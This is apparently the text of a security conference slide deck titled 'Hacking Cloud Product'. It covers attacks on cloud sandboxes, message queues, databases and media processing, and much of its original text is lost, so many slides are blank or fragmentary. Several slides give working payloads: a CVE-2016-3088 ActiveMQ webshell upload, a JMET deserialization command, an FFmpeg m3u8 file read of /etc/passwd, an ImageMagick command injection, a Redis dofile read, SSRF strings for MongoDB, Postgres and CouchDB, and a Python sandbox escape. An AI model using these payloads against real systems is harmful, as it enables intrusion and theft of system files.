Hacking Cloud Product
[ Demon@n0tr00t ]


[ Hacker@KCon ]

About me · Working  on  - · Team  of  n0tr00t  http://www.n0tr00t.com/ · ID:  Demon  (DemonDemo)   · Coding
3

Part.01

4


· 
  
· 

· 

5



 
    

Portal

Server



API

  

     
6

 - SandBox
·  ·              -JSMPHP  disabled  function             -DockerLinux  namespacecgroup             - · avoid  be  root,  use  linux  capability


 
7

Part.02

8




· portal,     · APIAPI
   · 
,redis,mongodb


·  ·    ·  ·  · 



·  · 


9


·    ·  
10


·  KafkaActiveMQRabbitMQOpenJMS       ·  DubbozookeeperTAF  
      ·  Load  eval  Mbean  via  "getMBeansFromURL"    http://www.n0tr00t.com/2015/04/16/JMX-RMI-Exploit.html        ·  Java  http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/        ·  XML
11

Use  Java  Message  Exploitation  Tool  (JMET)  
· Apache  ActiveMQ   · Redhat/Apache  HornetQ   · Oracle  OpenMQ   · IBM  WebSphereMQ   · Pivotal  RabbitMQ   · IIT  Software  SwiftMQ   · Apache  ActiveMQ  Artemis   · Apache  QPID  JMS   · Apache  QPID  Client  
https://github.com/matthiaskaiser/jmet  
         >  java  -jar  jmet-0.1.0-all.jar  -Q  event  -I  ActiveMQ  -Y  xterm  127.0.0.1  61616
12

ActiveMQ  CVE-2016-3088 PUT  /fileserver/shell.txt  HTTP/1.1   Host:  x.x.x.x   Content-Length:  16  
MOVE  /fileserver/shell.txt  HTTP/1.1   Destination:  file:///usr/local/apache-activemq-5.7.0/webapps/shell.jsp   Host:  x.x.x.x  
13

  
·    ·    ·    ·   
  
· ACLAPI   · XSS   · huesplunk  cactijekinszabbixzenosselasticsearch  
14

Use  hiveSQL  to  read  file
15

  
· Redis   · Mongodb   · Rsync   · Memcache
16

Part.03
-Hacking
17


18



 

19


20


21


22

·  ·  · 
23


24

FFmpeg:  
//exp.m3u8  
#EXTM3U   #EXT-X-MEDIA-SEQUENCE:0   #EXTINF:10.0,   concat:http://xxx/test.m3u8|file:///etc/passwd     #EXT-X-ENDLIST

ImageMagick:  
push  graphic-context   viewbox  0  0  640  480   fill  'url(https://example.com/image.jpg";|ls  "-la)'   pop  graphic-context

25

26

Redis  evaldofile  
$>EVAL  "return  dofile('/etc/passwd')"  0
27

· Mongodb  SSRF  
>db.copyDatabase("\nstats\nquit",'test','localhost:11211')

· Postgres  SSRF  
>SELECT  dblink_send_query('host=127.0.0.1  dbname=quit  user=\'\nstats\n\'  password=1  port=11211   sslmode=disable','select  version()')

· CouchDB  SSRF  

POST  http://couchdb:5984/_replicate   ContentType:  application/json   Accept:  application/json   {   "source"  :  "recipes",   "target"  :  "http://secretdb:11211/recipes",   }

SSRFbible  Cheatsheet

28

· 
--  FFmpeg  SSRF  &     -  ImageMagick  RCE   -   Linux  local  privileges  escape   -   CVE  ....
· 
-  python   -  php  bypass  disable_functions   -  redis  lua   -  mysqlmssql  
· 
-MSSQLMongodbPostgresCouchDB  SSRF   -  ()  
29


30

" "                                                                                                                                                                                 ----II  
31

  =     =  ()
32



server1

server2

server3

serverN



33



server1

server2

server3

serverN



34


server3
35



server1 server5

server2 server3

server4 serverN

36


· agent   · agent   · agent   · agent
37


38

RPC
39

RPC
40


41

IP  
·    ·    ·    ·   
42

  
· CDNWAF   · +  -->  -->IP   · API   ·   
43


  SSRF
python  
>>> [].__class__.__base__.__subclasses__()[58].__init__.func_globals['linecache'].__dict__.values()[14] <module 'os' from '/usr/lib64/python2.7/os.pyc'>
44


A RDSredisapp  engine 







A
 


45


46

  AK 
47

How  to  hack
48

How  to  hack  
·    ·    ·    ·    · Find  vulnerable  
49

THANKS
[ Demon@KCon ]

